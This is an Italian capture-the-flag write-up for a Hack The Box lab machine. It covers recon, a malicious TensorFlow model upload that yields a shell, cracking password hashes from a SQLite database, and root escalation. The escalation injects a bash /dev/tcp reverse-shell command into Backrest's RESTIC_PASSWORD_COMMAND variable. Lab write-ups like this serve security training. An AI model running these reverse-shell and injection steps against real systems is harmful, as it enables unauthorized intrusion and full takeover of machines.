@@ -1,0 +1,118 @@
+nmap 2 porte, ssh e nginx, suppone sia un sito con artificial.htb.
+Metto la linea su /etc/hosts
+
+10.10.11.74 artificial.htb
+
+Provo con un gobuster classico per vedere cosa trovo.
+/dashboard            (Status: 302) [Size: 199] [--> /login]
+/login                (Status: 200) [Size: 857]
+/logout               (Status: 302) [Size: 189] [--> /]
+/register             (Status: 200) [Size: 952]
+
+Nulla di interessante. Proviamo a fare un account
+
+Registo account con ${7*7} per testare arbitrary code, non funziona
+
+Due file scaricabili, Dockerfile che sembra normale e requirements
+tensorflow-cpu 2.13.1
+Capiamo che usiamo tensorflow
+Posso creare un payload malevolo suppongo visto che posso uploadare un file con modello
+
+Modello base per tensorflow
+import tensorflow as tf
+# 1. Crea il modello
+model = tf.keras.Sequential()
+# 2. Aggiungi layer di input (forma qualsiasi)
+model.add(tf.keras.layers.Input(shape=(64,)))
+# 3. Aggiungi layer di elaborazione
+model.add(tf.keras.layers.Dense(10))  # Layer normale
+# 4. Compila
+model.compile(optimizer='adam', loss='mse')
+# 5. Salva
+model.save("model.h5")
+
+Creo la reverse shell semplicemente partendo da questo
+
+Il docker è come un eseguibile ma ha anche sistema operativo, linguaggio, dipendenze, è utile per progetti grandi come modelli AI che hanno bisogno di tante dipendenze e requisiti.
+
+Per creare il exploit.h5 finale devo seguire i seguenti passaggi.
+
+Uso il dockerfile per creare l'immagine Docker che mi servirà
+docker build -t <nome-immagine-docker> .
+Avvio il container
+sudo docker run -it -v $(pwd):/code <nome-immagine-docker>
+Dentro al container, eseguo lo script
+python3 exploit.py
+Esco dal container
+exit
+
+Ora avrò creato il exploit.h5
+Funziona, dopo aver inviato il file. Ricevo la shell
+
+Soliti comandi per rendere la shell più interattiva
+Cerco user.txt non lo trovo.
+
+Cerco un po i files e trovo users.db
+Con file users.db trovo che è Sqlite. 
+Vado con
+sqlite3 users.db
+
+.tables trova due tabelle
+PRAGMA table_info(user);
+per cercare i campi
+
+SELECT * FROM users
+
+Trovo tutte le password hashate.
+Credo mi serva gael perché ho visto la sua cartella nel server prima, pero' nel dubbio piglio tutto
+
+Vado con hashcat
+hashcat -m 0 hashed_passwds.txt /usr/share/wordlists/rockyou.txt
+
+Trovo 8 password.
+Nel dettaglio quella di gael
+
+Entro con ssh. E trovo user.txt.
+
+PRIV ESCALATION
+Solite istruzioni iniziali
+
+-id
+-whoami
+-hostnamectl
+-sudo -l
+-ss -tulnp | grep LISTEN
+-ls -la /var/backups
+
+gael NON è root, c'è un backup /var/backups/backrest_backup.tar.gz e un servizio backrest interno in ascolto su 127.0.0.1:9898
+Backrest ha interfaccia web alla quale puoi accedere come admin e creare una repo con variabili env (quindi creare una shell root). Bisogna pero' conoscere le credenziali.
+
+Prendo il backup
+scp gael@10.10.11.74:/var/backups/backrest_backup.tar.gz .
+
+Lo apro e trovo la password hashata
+cat backrest/.config/backrest/config.json 
+echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP'| base64 -d > /tmp/bcrypt.hash
+
+uso hashcat solito e cracko, la password è 
+!@#$%^
+
+A questo punto per creare il servizio web faccio un ssh forwarded alla mia macchina
+ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
+
+A questo punto posso accedere con
+http://localhost:9898
+
+Una volta dentro, mi metto in ascolto con nc. 
+Creo repo in /opt e nelle variabili env metto
+
+RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/10.10.14.226/5444 0>&1'
+
+Quando lancio ottengo la reverse shell root
+Bingo
+
+
+
+
+
+
